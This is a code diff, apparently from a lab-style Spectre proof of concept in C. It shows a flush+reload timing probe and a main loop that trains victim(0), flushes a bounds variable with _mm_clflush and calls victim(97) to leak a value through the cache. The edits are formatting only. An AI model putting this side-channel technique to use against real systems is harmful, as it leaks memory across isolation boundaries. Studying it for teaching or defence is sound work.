@@ -43,7 +43,6 @@ int side_channel()
     {
         addr = &array[buffer[i]*4096 + DELTA];
         time = (int)probe(addr);
-        //printf("%d ", time);
         if (time <= CACHE_HIT_THRESHOLD)
         {
             printf("array[%d*4096 + %d] is in cache.\n", buffer[i], DELTA);
@@ -68,25 +67,20 @@ void victim(size_t x)
     }
 }
 
-int main() {
+int main()
+{
 
     int win;
     init_array();
 
-    while (1) {
-
-        for (int i = 0; i < 10; i++)
-        {   
-            victim(0);
-        }
+    while (1)
+    {
+        for (int i = 0; i < 10; i++) victim(0);
         
         _mm_clflush(&size);
         victim(97);
         win = side_channel();
-
-        if (win == 1){
-            break;
-        }
+        if (win == 1) break;
     }
     return 0; 
 }
